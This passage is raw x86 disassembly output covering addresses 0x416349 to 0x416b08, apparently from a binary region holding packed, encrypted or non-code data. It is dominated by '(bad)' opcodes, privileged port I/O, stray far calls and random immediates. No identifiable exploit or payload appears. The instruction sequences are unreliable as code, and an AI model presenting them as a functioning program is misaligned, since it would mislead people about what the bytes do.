  416349:	fistp  WORD PTR [edi+eiz*2+0x2bee2d81]
  416350:	push   esp
  416351:	frstor [eax+0x2a56e621]
  416357:	(bad)  
  416358:	fninit 
  41635a:	cwde   
  41635b:	hlt    
  41635c:	outs   dx,DWORD PTR ds:[si]
  41635e:	xor    bh,BYTE PTR [ebx]
  416360:	outs   dx,BYTE PTR ds:[esi]
  416361:	popf   
  416362:	outs   dx,BYTE PTR ds:[esi]
  416363:	ficom  WORD PTR [esi-0x16]
  416366:	nop
  416367:	fdiv   DWORD PTR [ebx+0x19a6e480]
  41636d:	mov    ecx,0xa813c789
  416372:	mov    esi,0xfe877c90
  416377:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416378:	out    dx,eax
  416379:	dec    ebx
  41637a:	call   0x375b6e99
  41637f:	lds    eax,FWORD PTR [ebx+0x1a]
  416382:	and    DWORD PTR [ebp-0x3b],0x19
  416386:	sub    DWORD PTR [eax+0x5e957333],esi
  41638c:	(bad)  [edi]
  41638e:	rcr    DWORD PTR [ebp-0x7e],0x28
  416392:	mov    ebp,0x3961b0c6
  416397:	fmul   DWORD PTR [ecx]
  416399:	fcmovne st,st(3)
  41639b:	xor    cl,BYTE PTR [ebp+esi*8-0x59]
  41639f:	xchg   esi,eax
  4163a0:	sahf   
  4163a1:	jmp    0x41639f
  4163a3:	ja     0x4163eb
  4163a5:	adc    ecx,DWORD PTR [ebx-0x79]
  4163a8:	xchg   BYTE PTR [edx-0x11c05d36],cl
  4163ae:	pop    ax
  4163b0:	sub    edx,DWORD PTR [esp-0x48]
  4163b4:	fsub   QWORD PTR [edi-0x8]
  4163b7:	mov    bh,0x8d
  4163b9:	outs   dx,DWORD PTR ds:[esi]
  4163ba:	shl    BYTE PTR [ebx],0x11
  4163bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4163be:	xor    DWORD PTR [edi+0x42ecfc9d],ecx
  4163c4:	inc    eax
  4163c5:	ds pop es
  4163c7:	or     eax,0xd644b671
  4163cc:	lods   eax,DWORD PTR ds:[esi]
  4163cd:	sub    al,0x83
  4163cf:	mov    dl,0x94
  4163d1:	dec    esi
  4163d2:	stos   BYTE PTR es:[edi],al
  4163d3:	fnstcw WORD PTR [edx+esi*2]
  4163d6:	and    BYTE PTR [eax-0x4ac1955c],0x8c
  4163dd:	push   edx
  4163de:	pop    es
  4163df:	mov    esp,0xd4a8aa2f
  4163e4:	in     al,0x39
  4163e6:	std    
  4163e7:	sub    DWORD PTR [eax+0x505defd6],esp
  4163ed:	fldenv [edi]
  4163ef:	repnz imul ebp,DWORD PTR [esi],0xffffff88
  4163f3:	lods   al,BYTE PTR ds:[esi]
  4163f4:	adc    eax,0xeac3f5b2
  4163f9:	jl     0x41641b
  4163fb:	mov    ds:0x25bee794,al
  416400:	jg     0x416441
  416402:	scas   eax,DWORD PTR es:[edi]
  416403:	stc    
  416404:	xchg   ebp,eax
  416405:	sbb    ch,BYTE PTR [eax-0xf]
  416408:	sub    al,0xf6
  41640a:	or     bh,BYTE PTR ds:0x5d2e2f46
  416410:	inc    edx
  416411:	mov    BYTE PTR [edx-0x36],ah
  416414:	imul   eax,DWORD PTR [esi-0x4f],0xffffff82
  416418:	inc    esp
  416419:	sub    al,0x58
  41641b:	shr    BYTE PTR [ebx+0x68],0x37
  41641f:	sub    esi,DWORD PTR gs:[ebx+0x3d]
  416423:	cmp    eax,0x1afa85eb
  416428:	sbb    al,0x7a
  41642a:	sbb    eax,edx
  41642c:	xchg   edi,eax
  41642d:	into   
  41642e:	daa    
  41642f:	push   eax
  416430:	push   0xd6edc2af
  416435:	repnz pop ss
  416437:	(bad)  
  416438:	fdivr  QWORD PTR [eax]
  41643a:	push   esp
  41643b:	dec    esp
  41643c:	repz aaa 
  41643e:	inc    esi
  41643f:	pop    es
  416440:	dec    ebx
  416441:	mov    ch,0xaf
  416443:	ja     0x416417
  416445:	push   edi
  416446:	shl    BYTE PTR [ecx-0x72],1
  416449:	(bad)  
  41644a:	idiv   dl
  41644c:	sub    al,0x3c
  41644e:	push   edx
  41644f:	loope  0x4164c4
  416451:	push   ds
  416452:	xchg   ebp,eax
  416453:	xchg   DWORD PTR [esi+0x1b],edx
  416456:	jp     0x416419
  416458:	lahf   
  416459:	xor    dh,BYTE PTR [edi+0x57]
  41645c:	jge    0x4164b7
  41645e:	mov    ebx,0x6ebcf3e4
  416463:	dec    edx
  416464:	xchg   esp,eax
  416465:	loope  0x41647b
  416467:	pop    ebp
  416468:	dec    esi
  416469:	daa    
  41646a:	and    BYTE PTR [ebx-0x6d67213b],dl
  416470:	loope  0x4164b5
  416472:	mov    ebx,0x9a3e6173
  416477:	dec    ebp
  416478:	mov    esp,0x5c266811
  41647d:	fcom   QWORD PTR [edi]
  41647f:	sbb    eax,0xea3bf030
  416484:	cmp    eax,0x2f86c13b
  416489:	dec    ebp
  41648a:	loope  0x4164cd
  41648c:	bound  esp,QWORD PTR [ebx+eax*1]
  41648f:	xlat   BYTE PTR ds:[ebx]
  416490:	push   ebx
  416491:	add    al,0xba
  416493:	gs cli 
  416495:	mov    ch,0x2e
  416497:	repz fwait
  416499:	out    0xb4,al
  41649b:	inc    ebx
  41649c:	and    DWORD PTR [eax],edi
  41649e:	xchg   DWORD PTR [ebx],esi
  4164a0:	xor    ah,BYTE PTR [ebx-0x3ac336d1]
  4164a6:	lock or al,0x50
  4164a9:	out    0xde,eax
  4164ab:	repnz push es
  4164ad:	or     DWORD PTR [edx],0xffffffb9
  4164b0:	add    bl,BYTE PTR ds:0x80be4951
  4164b6:	push   ecx
  4164b7:	ins    BYTE PTR es:[edi],dx
  4164b8:	mov    cl,0x7
  4164ba:	jb     0x416508
  4164bc:	divps  xmm5,XMMWORD PTR [ebx]
  4164bf:	mov    al,ds:0xf22f2b3e
  4164c4:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  4164c6:	and    cl,BYTE PTR [edx+0x75]
  4164c9:	in     eax,dx
  4164ca:	loopne 0x4164d7
  4164cc:	cmp    dh,BYTE PTR [eax+0x70]
  4164cf:	les    esp,FWORD PTR [ebx-0x2271a08e]
  4164d5:	dec    esp
  4164d6:	xchg   esi,eax
  4164d7:	xchg   esp,eax
  4164d8:	jb     0x4164fb
  4164da:	vunpckhps ymm1,ymm0,YMMWORD PTR [ebx-0x78]
  4164df:	mov    cs,WORD PTR [eax+0x46a73098]
  4164e5:	ins    BYTE PTR es:[edi],dx
  4164e6:	cmp    ah,BYTE PTR [eax*4+0x7b4e76f6]
  4164ed:	fld    TBYTE PTR [ebp-0x2baaccdd]
  4164f3:	dec    esp
  4164f4:	in     eax,dx
  4164f5:	iret   
  4164f6:	dec    ecx
  4164f7:	arpl   WORD PTR [esi+eiz*8+0x2c609f43],dx
  4164fe:	lahf   
  4164ff:	das    
  416500:	mov    edx,0xf186028b
  416505:	shl    BYTE PTR [edx+edi*2-0x5a],cl
  416509:	popf   
  41650a:	pop    es
  41650b:	xchg   DWORD PTR [ecx+edx*2-0x634a7b9],eax
  416512:	nop
  416513:	dec    ecx
  416514:	(bad)  
  416516:	scas   eax,DWORD PTR es:[edi]
  416517:	cwde   
  416518:	xchg   ecx,eax
  416519:	imul   DWORD PTR [ebx+edx*8+0x1e]
  41651d:	dec    ebx
  41651e:	sahf   
  41651f:	(bad)  
  416520:	jne    0x41658f
  416522:	out    dx,al
  416523:	sub    ebp,eax
  416525:	(bad)  
  416526:	fst    st(6)
  416528:	scas   al,BYTE PTR es:[edi]
  416529:	xchg   ecx,eax
  41652a:	inc    eax
  41652b:	in     al,dx
  41652c:	data16 adc ch,BYTE PTR [esi-0x47d642e4]
  416533:	pop    esi
  416534:	test   DWORD PTR [ecx+0x5f],edx
  416537:	cmp    ebx,edi
  416539:	out    dx,eax
  41653a:	xchg   BYTE PTR [esi-0x3a],ch
  41653d:	push   ebp
  41653e:	cmp    bh,BYTE PTR [ecx+ebx*1-0x2b21042]
  416545:	and    esi,ecx
  416547:	jne    0x41657e
  416549:	xchg   esi,eax
  41654a:	popa   
  41654b:	xchg   edx,eax
  41654c:	shl    ecx,0x7e
  41654f:	repz ffreep st(5)
  416552:	fdiv   QWORD PTR [ecx-0x4194ce7b]
  416558:	xor    BYTE PTR [ecx-0x46],dh
  41655b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41655c:	test   eax,0xc0b1bf0
  416561:	mov    ah,BYTE PTR [ecx]
  416563:	mov    eax,ds:0xb97bbf99
  416568:	adc    DWORD PTR [esi-0x340661ba],eax
  41656e:	jo     0x4165ca
  416570:	adc    bl,BYTE PTR [edx-0x2b]
  416573:	fdivr  DWORD PTR [ecx+ebx*8-0x730e020d]
  41657a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41657b:	adc    ecx,ebx
  41657d:	cmp    al,0x35
  41657f:	outs   dx,BYTE PTR ds:[esi]
  416580:	pop    ds
  416581:	ret    
  416582:	dec    esp
  416583:	icebp  
  416584:	lahf   
  416585:	pop    fs
  416587:	stos   BYTE PTR es:[edi],al
  416588:	sbb    BYTE PTR [esi],ah
  41658a:	loope  0x41653f
  41658c:	inc    eax
  41658d:	scas   al,BYTE PTR es:[edi]
  41658e:	pop    ss
  41658f:	pop    ds
  416590:	outs   dx,DWORD PTR ds:[esi]
  416591:	call   0x2dc6:0x47f63870
  416598:	scas   eax,DWORD PTR es:[edi]
  416599:	pop    ebx
  41659a:	leave  
  41659b:	test   BYTE PTR [edi+eax*2],dl
  41659e:	test   eax,0xf0e40e99
  4165a3:	repz in eax,dx
  4165a5:	inc    edi
  4165a6:	(bad)  
  4165a7:	adc    eax,0x8e9f1bf8
  4165ac:	jmp    0x3eab:0x23ee39bc
  4165b3:	jbe    0x4165fb
  4165b5:	jnp    0x416551
  4165b7:	call   edx
  4165b9:	dec    ebx
  4165ba:	pop    ds
  4165bb:	cli    
  4165bc:	sbb    cl,cl
  4165be:	sub    BYTE PTR [ecx],dh
  4165c0:	in     al,0xa6
  4165c2:	push   ecx
  4165c3:	fwait
  4165c4:	pusha  
  4165c5:	cmc    
  4165c6:	jmp    0x64617a14
  4165cb:	push   0x63e2412c
  4165d0:	(bad)  
  4165d1:	jmp    0x416593
  4165d3:	sub    DWORD PTR [eax],ebp
  4165d5:	sbb    BYTE PTR [edx+0x27775e4],bh
  4165db:	mov    DWORD PTR [ebp+0x5d],0xb08d7a28
  4165e2:	into   
  4165e3:	fs mov ah,0x5e
  4165e6:	mov    eax,ds
  4165e8:	push   ecx
  4165e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165ea:	jno    0x416628
  4165ec:	enter  0x65fe,0xd0
  4165f0:	inc    eax
  4165f1:	cld    
  4165f2:	cmp    esp,DWORD PTR [eax+eiz*1+0x3a]
  4165f6:	cld    
  4165f7:	ins    BYTE PTR es:[edi],dx
  4165f8:	cmp    esi,DWORD PTR [ebp+0x5b6dbf9a]
  4165fe:	int    0xa3
  416600:	pop    esp
  416601:	call   0xb2f0:0x80f38905
  416608:	sbb    al,0x7f
  41660a:	xchg   al,dl
  41660c:	sbb    eax,0xcecc0051
  416611:	inc    edx
  416612:	mov    cl,0xaa
  416614:	hlt    
  416615:	xchg   esp,eax
  416616:	in     al,dx
  416617:	adc    DWORD PTR [ebx],0xffffffd0
  41661a:	int3   
  41661b:	mov    esp,0xcc09e117
  416620:	sahf   
  416621:	fwait
  416622:	pop    ecx
  416623:	dec    dx
  416625:	sbb    al,0xa2
  416627:	imul   edi,DWORD PTR [edi],0x21a5f125
  41662d:	jae    0x4166a9
  41662f:	sahf   
  416630:	push   edx
  416631:	(bad)  
  416632:	hlt    
  416633:	daa    
  416634:	xchg   DWORD PTR [eax-0x2b],esi
  416637:	adc    BYTE PTR ss:[esi+0x11327a3c],bh
  41663e:	pop    eax
  41663f:	add    eax,0x35412897
  416644:	lock popf 
  416646:	mov    ecx,gs
  416648:	(bad)  
  416649:	mov    edi,0x73f9b919
  41664e:	cli    
  41664f:	jmp    0x8f640be0
  416654:	cmc    
  416655:	mov    dl,0x85
  416657:	test   BYTE PTR [ebp-0x75],0x36
  41665b:	repz inc eax
  41665d:	adc    al,0x46
  41665f:	jg     0x416657
  416661:	data16 int3 
  416663:	ffree  st(1)
  416665:	adc    cl,BYTE PTR [edx-0x1c2ffbf3]
  41666b:	adc    al,0xfe
  41666d:	fsubr  QWORD PTR [eax+ebp*1+0x1a]
  416671:	adc    DWORD PTR [esi],esp
  416673:	lahf   
  416674:	xchg   esi,eax
  416675:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416676:	xor    DWORD PTR [edi+0x3b],esp
  416679:	rcl    DWORD PTR [edx],0xe3
  41667c:	inc    ebp
  41667d:	pop    ebx
  41667e:	fisttp DWORD PTR [ebp-0x45f05ad1]
  416684:	imul   ebp,DWORD PTR [esi],0x60df5ddd
  41668a:	inc    esi
  41668b:	fwait
  41668c:	dec    ebx
  41668d:	adc    DWORD PTR [esi+0xc],0x65afc756
  416694:	mov    dl,0xe5
  416696:	mov    eax,ds:0x79881e7a
  41669b:	js     0x416686
  41669d:	and    al,0x35
  41669f:	in     al,0xcf
  4166a1:	(bad)  
  4166a2:	call   FWORD PTR [eax-0x699054cc]
  4166a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4166a9:	bound  edx,QWORD PTR [eax+0x50]
  4166ac:	out    0x91,eax
  4166ae:	cli    
  4166af:	aaa    
  4166b0:	out    dx,al
  4166b1:	push   cs
  4166b2:	icebp  
  4166b3:	push   es
  4166b4:	mov    bh,ah
  4166b6:	leave  
  4166b7:	mov    eax,DWORD PTR [edx+0x1be9d677]
  4166bd:	mov    dl,0xc5
  4166bf:	fild   WORD PTR [eax+0x4c]
  4166c2:	cmp    al,0x1
  4166c4:	fsub   DWORD PTR ds:0x4a1b3874
  4166ca:	pop    ds
  4166cb:	jge    0x4166e6
  4166cd:	xor    DWORD PTR [ebp+0xc],ecx
  4166d0:	jmp    0xd79deba5
  4166d5:	sbb    al,0x14
  4166d7:	pop    es
  4166d8:	add    al,0x51
  4166da:	xor    cl,BYTE PTR [ecx]
  4166dc:	cs mov cl,0x14
  4166df:	and    BYTE PTR [esi-0x51fc4328],ch
  4166e5:	xchg   esp,eax
  4166e6:	sar    BYTE PTR [edi-0x3d1d03e0],1
  4166ec:	mov    bl,0xf
  4166ee:	ret    0xeb58
  4166f1:	xor    bh,bl
  4166f3:	mov    ds:0x67f9e847,eax
  4166f8:	popf   
  4166f9:	push   cs
  4166fa:	(bad)  
  4166fb:	xor    cl,BYTE PTR [edx]
  4166fd:	retf   
  4166fe:	dec    ebp
  4166ff:	sub    bh,BYTE PTR [edx-0x69]
  416702:	out    0xa1,eax
  416704:	cmp    esp,0x1
  416707:	(bad)
  41670a:	hlt    
  41670b:	fst    QWORD PTR [edx]
  41670d:	test   BYTE PTR [esp+ebx*4+0x6a],bl
  416711:	adc    BYTE PTR [edx-0x2367fd7f],dl
  416717:	test   DWORD PTR [edi+0x1d79470f],ebx
  41671d:	fcom   DWORD PTR [ecx+0x28485abc]
  416723:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416724:	push   cs
  416725:	pop    esp
  416726:	dec    ebp
  416727:	jns    0x41675a
  416729:	lds    esp,FWORD PTR [edi+0x3c442d0]
  41672f:	xchg   ebx,eax
  416730:	imul   esi,DWORD PTR [esi-0x10],0xffffffc4
  416734:	icebp  
  416735:	add    eax,0x11bcf732
  41673a:	inc    ebx
  41673b:	push   eax
  41673c:	or     al,0x20
  41673e:	mov    edi,DWORD PTR [ecx-0x1ec142b8]
  416744:	sub    cl,BYTE PTR [edi-0x74]
  416747:	add    BYTE PTR [esi+ecx*8+0x3a3beb47],0x36
  41674f:	cs inc edx
  416751:	or     BYTE PTR cs:[eax],ch
  416754:	inc    edi
  416755:	lea    ebx,[esi-0x7b310a5]
  41675b:	adc    al,0xf
  41675d:	ja     0x41675a
  41675f:	inc    esi
  416760:	into   
  416761:	out    0x95,eax
  416763:	clc    
  416764:	test   eax,0xca458248
  416769:	jle    0x4167d8
  41676b:	sar    DWORD PTR [edx],1
  41676d:	dec    ebx
  41676e:	ss xor eax,0x434575bd
  416774:	sub    esp,DWORD PTR [ebp-0x3724be81]
  41677a:	xor    DWORD PTR [ebp+0x210b33fa],0x13ef6233
  416784:	inc    DWORD PTR [edi-0x25]
  416787:	sbb    BYTE PTR [edi+0x3e],0xff
  41678b:	stos   DWORD PTR es:[edi],eax
  41678c:	fbstp  TBYTE PTR [ecx]
  41678e:	and    ecx,0xfffffffd
  416791:	pop    esp
  416792:	adc    bl,bh
  416794:	scas   al,BYTE PTR es:[edi]
  416795:	imul   edi,DWORD PTR [ebx],0x3f
  416798:	fiadd  DWORD PTR [eax]
  41679a:	fs jae 0x416807
  41679d:	call   0x4d5d:0xf3b7b033
  4167a4:	cmp    dl,BYTE PTR [ebp+0x26]
  4167a7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4167a8:	mov    al,fs:0xa4090386
  4167ae:	cli    
  4167af:	aas    
  4167b0:	cmp    bh,cl
  4167b2:	cld    
  4167b3:	lds    ebx,FWORD PTR [edi+0x77]
  4167b6:	mov    dh,0x9f
  4167b8:	call   0x7a94:0xad80c3a9
  4167bf:	fstp   DWORD PTR ds:0x8e67471a
  4167c5:	pusha  
  4167c6:	shr    BYTE PTR [edx+0x1af11d8b],0xff
  4167cd:	in     eax,0xb7
  4167cf:	dec    ebp
  4167d0:	icebp  
  4167d1:	lods   al,BYTE PTR ds:[esi]
  4167d2:	mov    ds:0x320994b6,eax
  4167d7:	cwde   
  4167d8:	add    eax,0x6cc8e888
  4167dd:	push   esi
  4167de:	hlt    
  4167df:	scas   eax,DWORD PTR es:[edi]
  4167e0:	hlt    
  4167e1:	nop
  4167e2:	cmp    eax,0x95d3347c
  4167e7:	cmp    BYTE PTR [esi+0x5],cl
  4167ea:	into   
  4167eb:	int3   
  4167ec:	mov    dh,0x56
  4167ee:	sub    edx,DWORD PTR [esi-0x4c030ad6]
  4167f4:	push   eax
  4167f5:	mov    edx,0x56e891bb
  4167fa:	fs enter 0xd725,0xa1
  4167ff:	push   es
  416800:	popf   
  416801:	mov    ds:0x7666faac,eax
  416806:	jmp    0x49b0:0x5317b776
  41680d:	in     al,dx
  41680e:	repz ret 
  416810:	into   
  416811:	mov    edx,0x7ec717ac
  416816:	in     eax,dx
  416817:	inc    ebp
  416818:	into   
  416819:	stos   BYTE PTR es:[edi],al
  41681a:	jp     0x4167c5
  41681c:	jb     0x4167f3
  41681e:	xor    BYTE PTR [edx+esi*1-0x5a],ah
  416822:	sbb    al,al
  416824:	or     al,0xf
  416826:	cmp    al,0x6
  416828:	adc    ebx,edi
  41682a:	pop    ecx
  41682b:	loopne 0x4167ce
  41682d:	jo     0x4167c4
  41682f:	shl    BYTE PTR [edi-0x34],0x40
  416833:	jmp    0x4168a7
  416835:	pop    esp
  416836:	cwde   
  416837:	iret   
  416838:	and    ebp,DWORD PTR [ecx+0x58287398]
  41683e:	jp     0x416832
  416840:	lods   eax,DWORD PTR ds:[esi]
  416841:	mov    ch,0xfe
  416843:	mov    eax,ds:0x7f74dc61
  416848:	out    0xf,al
  41684a:	sahf   
  41684b:	leave  
  41684c:	sbb    DWORD PTR [edx-0x7b4ffb43],edx
  416852:	shl    DWORD PTR [eax],1
  416854:	(bad)  
  416855:	cmp    ah,BYTE PTR [eax+0x33]
  416858:	xchg   edx,eax
  416859:	in     al,dx
  41685a:	fxch   st(7)
  41685c:	jo     0x416858
  41685e:	xlat   BYTE PTR ds:[ebx]
  41685f:	sub    bh,cl
  416861:	sbb    DWORD PTR [edi-0x48],esi
  416864:	jnp    0x41680e
  416866:	pop    edx
  416868:	cmp    cl,BYTE PTR ds:[edi]
  41686b:	ins    BYTE PTR es:[edi],dx
  41686c:	mov    ecx,DWORD PTR [edi-0x14bc8e87]
  416872:	add    edi,ebx
  416874:	dec    edx
  416875:	ret    
  416876:	add    edx,0xbab9510f
  41687c:	xchg   esi,eax
  41687d:	mov    eax,0xac199494
  416882:	mov    cl,0xe
  416884:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416885:	retf   
  416886:	and    DWORD PTR [ecx+0x72d55747],ebx
  41688c:	jp     0x4168db
  41688e:	and    BYTE PTR [ecx+0x3c],ch
  416891:	lock ins BYTE PTR es:[edi],dx
  416893:	fwait
  416894:	pop    edi
  416895:	xor    ah,ch
  416897:	xor    eax,DWORD PTR [eax]
  416899:	aad    0x7b
  41689b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41689c:	(bad)
  41689f:	pushf  
  4168a0:	jae    0x41688f
  4168a2:	mov    esp,0x92e3e212
  4168a7:	sub    eax,0xd84c0f4a
  4168ac:	frstor [ecx]
  4168ae:	mov    bh,0x6c
  4168b0:	mov    ss,WORD PTR [ecx+eax*1+0x51]
  4168b4:	nop
  4168b5:	rcr    DWORD PTR [ebp+0x36],cl
  4168b8:	ins    DWORD PTR es:[edi],dx
  4168b9:	leave  
  4168ba:	inc    esi
  4168bb:	pop    es
  4168bc:	inc    eax
  4168bd:	fld    QWORD PTR [edi]
  4168bf:	adc    al,0x1a
  4168c1:	test   BYTE PTR [ecx+0x6badb17c],0x30
  4168c8:	sbb    al,BYTE PTR [ecx-0x5d]
  4168cb:	push   ss
  4168cc:	xor    BYTE PTR [esi+0x1a40820f],dl
  4168d2:	leave  
  4168d3:	mov    BYTE PTR [edx],dl
  4168d5:	push   ebp
  4168d6:	rcr    BYTE PTR [esi],cl
  4168d8:	mov    edi,0x15f73b82
  4168dd:	pusha  
  4168de:	shr    DWORD PTR [ecx+0x7e],cl
  4168e1:	and    DWORD PTR [edi+0x1a9415dd],edi
  4168e7:	cmp    ebx,DWORD PTR ds:0x3221b8df
  4168ed:	rcl    dh,0x13
  4168f0:	dec    ecx
  4168f1:	ss pop es
  4168f3:	cmc    
  4168f4:	fwait
  4168f5:	sar    BYTE PTR [ebx+0x97f3daf],cl
  4168fb:	pushf  
  4168fc:	inc    ebp
  4168fd:	cmp    eax,0xae50a44f
  416902:	bound  edx,QWORD PTR [edx]
  416904:	test   edi,0x3d3df113
  41690a:	inc    eax
  41690b:	inc    esp
  41690c:	lock (bad) 
  41690e:	jo     0x416982
  416910:	test   DWORD PTR [edx],edi
  416912:	jl     0x416981
  416914:	(bad)  
  416915:	fistp  DWORD PTR [ecx]
  416917:	push   edx
  416918:	ret    
  416919:	sub    bh,BYTE PTR [ecx-0x9]
  41691c:	jp     0x416930
  41691e:	test   eax,0x952d44b7
  416923:	add    al,0xcf
  416925:	imul   eax,DWORD PTR [edi-0x43],0xe41c362d
  41692c:	pop    ds
  41692d:	iret   
  41692e:	sahf   
  41692f:	sub    cl,dh
  416931:	repz repnz aam 0x32
  416935:	sbb    edi,esi
  416937:	mov    al,0x60
  416939:	push   ds
  41693a:	xor    eax,DWORD PTR [eax]
  41693c:	mov    al,0xdd
  41693e:	fdivr  st(4),st
  416940:	nop
  416941:	add    DWORD PTR [edi+0x1df4ae38],0x6e337cb7
  41694b:	and    BYTE PTR [edx+0x1da33b9a],dh
  416951:	lahf   
  416952:	adc    BYTE PTR [edi],bl
  416954:	rcl    BYTE PTR [eax],0xed
  416957:	stc    
  416958:	fstp   QWORD PTR [edi+0x5518b5e5]
  41695e:	push   ss
  41695f:	pop    ecx
  416960:	sbb    eax,0xbd20679c
  416965:	ret    0xe649
  416968:	sar    DWORD PTR [ecx+esi*4],1
  41696b:	cmp    BYTE PTR es:[ebx+0x57],al
  41696f:	push   edx
  416970:	jl     0x4169e3
  416972:	rcl    BYTE PTR [esi-0x5],cl
  416975:	test   BYTE PTR [ebx+ecx*4+0x79af19b6],0xf2
  41697d:	cs (bad) 
  41697f:	test   BYTE PTR [di],al
  416982:	inc    esi
  416983:	xchg   BYTE PTR ds:0xf8ac9794,bh
  416989:	inc    BYTE PTR [edi-0x4b8f930f]
  41698f:	fs dec edx
  416991:	pop    ecx
  416992:	mov    ecx,0x4e903b5c
  416997:	xchg   DWORD PTR [ebx+0x74],edi
  41699a:	idiv   ah
  41699c:	xchg   ebx,eax
  41699d:	push   cs
  41699e:	ret    
  41699f:	stos   DWORD PTR es:[edi],eax
  4169a0:	sub    ebx,DWORD PTR [ecx-0x2a]
  4169a3:	add    ch,bh
  4169a5:	pop    edi
  4169a6:	jmp    0x45e7:0xdc502ad8
  4169ad:	scas   al,BYTE PTR es:[edi]
  4169ae:	push   0xf0ed629a
  4169b3:	cmp    ebp,esi
  4169b5:	test   al,0x82
  4169b7:	test   al,0x86
  4169b9:	in     al,dx
  4169ba:	push   cs
  4169bb:	add    cl,cl
  4169bd:	mov    dl,0xad
  4169bf:	adc    edx,esp
  4169c1:	sti    
  4169c2:	hlt    
  4169c3:	dec    esp
  4169c4:	sbb    dh,BYTE PTR [ecx]
  4169c6:	call   0x8e07:0x4c09cf7e
  4169cd:	push   ebx
  4169ce:	retf   
  4169cf:	ret    0xc50a
  4169d2:	xor    al,0x79
  4169d4:	lea    esp,[esi+0x3]
  4169d7:	dec    edx
  4169d8:	fdiv   DWORD PTR [edi-0xe]
  4169db:	xchg   ecx,eax
  4169dc:	std    
  4169dd:	sub    BYTE PTR [edi-0x5949ef40],dh
  4169e3:	arpl   WORD PTR [ebx+0x5238a2cd],dx
  4169e9:	shr    DWORD PTR [edi+eiz*2],1
  4169ec:	int    0xbe
  4169ee:	lock xchg esp,eax
  4169f0:	lds    edi,FWORD PTR [eax-0x29]
  4169f3:	mov    edx,DWORD PTR [eax+0xa]
  4169f6:	xor    al,0x49
  4169f8:	and    al,0x30
  4169fa:	std    
  4169fb:	(bad)  
  4169fc:	aad    0xa7
  4169fe:	dec    esp
  4169ff:	mov    cl,0x3d
  416a01:	stos   DWORD PTR es:[edi],eax
  416a02:	xor    eax,0x4c187a96
  416a07:	jo     0x416a33
  416a09:	shl    BYTE PTR [esi],cl
  416a0b:	inc    ecx
  416a0c:	mov    esi,0x7acf10d2
  416a11:	push   ebx
  416a12:	stc    
  416a13:	int3   
  416a14:	push   0x71
  416a16:	aad    0x64
  416a18:	nop
  416a19:	xor    ebp,0x1f
  416a1c:	ret    0xf8f
  416a1f:	icebp  
  416a20:	push   0xce48adf4
  416a25:	shl    edi,cl
  416a27:	in     al,0xd6
  416a29:	jnp    0x416a57
  416a2b:	and    dh,cl
  416a2d:	cmp    al,bh
  416a2f:	out    dx,eax
  416a30:	dec    edx
  416a31:	addr16 leave 
  416a33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416a34:	fnstsw WORD PTR [ebx]
  416a36:	mov    cl,0x18
  416a38:	mov    gs,WORD PTR [ebx+0x40fcb9ee]
  416a3e:	ds mov ebx,0x6f1c9f07
  416a44:	js     0x4169ef
  416a46:	out    0xde,eax
  416a48:	add    BYTE PTR [ebp+0x32],0xf4
  416a4c:	test   DWORD PTR [ebx+0x3818f7ec],esp
  416a52:	call   0xcf41:0xce06c082
  416a59:	ds pop ds
  416a5b:	or     BYTE PTR [ebp-0x218acc56],bh
  416a61:	mov    ds:0x7de152da,al
  416a66:	push   0x1fbe3b00
  416a6b:	push   ss
  416a6c:	in     eax,0xd0
  416a6e:	push   ss
  416a6f:	xor    esp,DWORD PTR [ecx-0x21]
  416a72:	aam    0xe3
  416a74:	adc    eax,DWORD PTR [ecx-0x64932a6c]
  416a7a:	add    DWORD PTR [ecx+ebp*1+0x3a554ba8],esi
  416a81:	pop    esp
  416a82:	ret    
  416a83:	cmp    edx,DWORD PTR [esi+0x2a8a4f53]
  416a89:	nop
  416a8a:	inc    edi
  416a8b:	mov    dl,0x27
  416a8d:	test   bl,dl
  416a8f:	mov    DWORD PTR [esi],ebp
  416a91:	inc    edx
  416a92:	jo     0x416ac2
  416a94:	fwait
  416a95:	ja     0x416a63
  416a97:	or     BYTE PTR ss:[eax],dl
  416a9a:	jne    0x416a35
  416a9c:	retf   0xa868
  416a9f:	je     0x416ab8
  416aa1:	in     al,0x18
  416aa3:	or     BYTE PTR [ebp-0x7f],bl
  416aa6:	mov    edi,0x7475bf2d
  416aab:	in     eax,0x58
  416aad:	rcl    DWORD PTR [ecx],cl
  416aaf:	inc    edi
  416ab0:	xor    al,dh
  416ab2:	retf   
  416ab3:	push   esp
  416ab4:	fldenv [ebp+0x7e]
  416ab7:	sub    esp,DWORD PTR es:[eax+eax*2+0x78]
  416abc:	div    BYTE PTR [edx]
  416abe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416abf:	and    esi,ecx
  416ac1:	pxor   mm6,QWORD PTR [ebx+0x20325ee7]
  416ac8:	fadd   DWORD PTR [ebx-0x66]
  416acb:	lods   eax,DWORD PTR ds:[esi]
  416acc:	dec    esp
  416acd:	mov    ebx,0x5912ac7d
  416ad2:	fidiv  DWORD PTR [ebp+0xd]
  416ad5:	call   0xf5b46c6
  416ada:	xchg   BYTE PTR [edi+0x40],al
  416add:	ret    0xe5a6
  416ae0:	xchg   esi,eax
  416ae1:	(bad)  
  416ae2:	test   eax,0x2c5fc0c
  416ae7:	loope  0x416ae8
  416ae9:	mov    ch,al
  416aeb:	imul   eax,DWORD PTR [ebx+0x14ab204d],0x7b
  416af2:	in     eax,0x1
  416af4:	xor    DWORD PTR [edx+0x58],ebp
  416af7:	add    BYTE PTR [esi],ch
  416af9:	push   cs
  416afa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416afb:	mov    BYTE PTR [di],al
  416afe:	loope  0x416b68
  416b00:	jb     0x416af5
  416b02:	mov    eax,0x8e6c3f8a
  416b07:	leave  
  416b08:	and    BYTE PTR ss:[edi-0x9],al
